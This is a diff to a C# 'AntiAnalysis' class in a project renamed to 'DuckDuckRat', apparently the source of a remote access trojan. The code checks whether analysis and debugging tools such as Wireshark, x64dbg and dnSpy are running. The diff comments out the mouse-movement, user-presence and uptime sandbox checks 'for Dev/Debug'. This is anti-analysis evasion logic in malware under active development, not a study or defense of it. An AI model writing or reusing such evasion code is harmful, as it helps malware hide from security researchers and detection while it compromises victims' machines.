@@ -8,7 +8,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Management;
 
-namespace VanguardCore.Defense
+namespace DuckDuckRat.Defense
 {
     public static class AntiAnalysis
     {
@@ -69,14 +69,14 @@ namespace VanguardCore.Defense
             string[] tools = { "wireshark", "x64dbg", "processhacker", "glasswire", "dnspy" };
             foreach (var tool in tools) if (Process.GetProcessesByName(tool).Length > 0) return true;
 
-            // 9. Mouse Movement Check
-            if (CheckMouseMovement()) return true;
+            // 9. Mouse Movement Check (Disabled for Dev/Debug)
+            // if (CheckMouseMovement()) return true;
 
-            // 10. User Presence Check
-            if (CheckUserPresence()) return true;
+            // 10. User Presence Check (Disabled for Dev/Debug)
+            // if (CheckUserPresence()) return true;
 
-            // 11. System Uptime Check
-            if (CheckUptime()) return true;
+            // 11. System Uptime Check (Disabled for Dev/Debug)
+            // if (CheckUptime()) return true;
 
             return false;
         }
@@ -153,3 +153,5 @@ namespace VanguardCore.Defense
         private static extern long GetTickCount64();
     }
 }
+
+
